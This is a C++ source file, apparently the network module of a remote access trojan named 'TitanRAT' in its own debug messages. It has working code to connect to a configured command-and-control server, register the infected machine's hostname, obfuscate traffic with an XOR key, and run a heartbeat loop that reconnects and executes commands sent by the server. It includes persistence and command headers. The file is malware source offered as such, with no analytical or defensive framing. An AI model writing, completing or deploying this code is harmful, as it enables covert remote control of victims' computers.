// Core/network.cpp
#include "network.h"
#include "persistence.h"
#include "commands.h"
#include <windows.h>
#include <stdio.h>

std::string g_bot_id;
const unsigned char XOR_KEY = 0xAA;

bool init_winsock() {
    WSADATA wsa;
    return WSAStartup(MAKEWORD(2, 2), &wsa) == 0;
}

void cleanup_winsock() {
    WSACleanup();
}

SOCKET connect_to_server(const std::string& ip, int port) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return INVALID_SOCKET;

    // 5s connect timeout: use non-blocking + select
    u_long mode = 1;
    ioctlsocket(sock, FIONBIO, &mode);

    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip.c_str());

    int res = connect(sock, (sockaddr*)&server, sizeof(server));
    if (res == SOCKET_ERROR && WSAGetLastError() != WSAEWOULDBLOCK) {
        closesocket(sock);
        return INVALID_SOCKET;
    }

    // Wait up to 5000ms
    fd_set set;
    FD_ZERO(&set);
    FD_SET(sock, &set);
    struct timeval tv = {5, 0};

    if (select(0, NULL, &set, NULL, &tv) > 0) {
        int err = 0;
        int len = sizeof(err);
        getsockopt(sock, SOL_SOCKET, SO_ERROR, (char*)&err, &len);
        if (err == 0) {
            // Back to blocking with 5s recv timeout
            mode = 0;
            ioctlsocket(sock, FIONBIO, &mode);
            DWORD timeout = 5000;
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
            return sock;
        }
    }
    closesocket(sock);
    return INVALID_SOCKET;
}

static void send_all(SOCKET sock, const char* buf, int len) {
    int sent = 0;
    while (sent < len) {
        int n = send(sock, buf + sent, len - sent, 0);
        if (n <= 0) break;
        sent += n;
    }
}

void send_encrypted(SOCKET sock, const std::string& data) {
    std::string encrypted = data;
    for (size_t i = 0; i < encrypted.size(); i++) encrypted[i] ^= XOR_KEY;
    send_all(sock, encrypted.c_str(), encrypted.length());
}

std::string recv_encrypted_line(SOCKET sock) {
    static char buffer[8192] = {0};
    static int buf_len = 0;

    while (true) {
        char tmp[1024];
        int n = recv(sock, tmp, sizeof(tmp), 0);
        if (n <= 0) {
            buf_len = 0; // Connection lost / timeout
            return "";
        }
        // Decrypt in-place
        for (int i = 0; i < n; i++) tmp[i] ^= XOR_KEY;

        // Append to buffer
        if (buf_len + n < sizeof(buffer)) {
            memcpy(buffer + buf_len, tmp, n);
            buf_len += n;
        } else {
            buf_len = 0; // Overflow protection
            return "";
        }

        // Search for \n
        for (int i = 0; i < buf_len; i++) {
            if (buffer[i] == '\n') {
                std::string line(buffer, i);
                if (!line.empty() && line.back() == '\r') line.pop_back();
                memmove(buffer, buffer + i + 1, buf_len - i - 1);
                buf_len -= (i + 1);
                return line;
            }
        }
    }
}

void register_with_server(SOCKET sock, const std::string& hostname, std::string& bot_id) {
    send_encrypted(sock, "HELLO\n");
    std::string ack = recv_encrypted_line(sock);
    if (ack != "ACK") {
        OutputDebugStringA("[TitanRAT] Registration failed: no ACK\n");
        return;
    }

    std::string reg = "REGISTER:" + hostname + "\n";
    send_encrypted(sock, reg);
    std::string id_line = recv_encrypted_line(sock);
    if (id_line.rfind("ID:", 0) == 0) {
        bot_id = id_line.substr(3);
        OutputDebugStringA("[TitanRAT] Registered with ID: ");
        OutputDebugStringA(bot_id.c_str());
        OutputDebugStringA("\n");
    } else {
        OutputDebugStringA("[TitanRAT] Invalid ID format received\n");
    }
}

void process_command(const std::string& cmd, SOCKET sock) {
    // Delegate to the new dispatcher
    std::string result = execute_builtin_command(cmd, sock);
    
    // If we are here, the process hasn't exited (i.e., not 'uninstall')
    // Send the result back
    send_encrypted(sock, result + "\n");
}

void heartbeat_loop(SOCKET& sock, const Config& cfg) {
    if (g_bot_id.empty()) return;

    while (true) {
        Sleep(cfg.heartbeat_interval * 1000);
        
        std::string beat = "BEAT:" + g_bot_id + "\n";
        send_encrypted(sock, beat);

        std::string resp = recv_encrypted_line(sock);
        if (resp.empty()) {
            OutputDebugStringA("[TitanRAT] Heartbeat timeout, reconnecting in 10s...\n");
            closesocket(sock);
            Sleep(10000);
            sock = connect_to_server(cfg.c2_ip, cfg.c2_port);
            if (sock != INVALID_SOCKET) {
                char hostname[MAX_COMPUTERNAME_LENGTH + 1];
                DWORD size = sizeof(hostname);
                GetComputerNameA(hostname, &size);
                register_with_server(sock, hostname, g_bot_id);
            }
            if (sock == INVALID_SOCKET) continue;
            continue;
        }

        process_command(resp, sock);
    }
}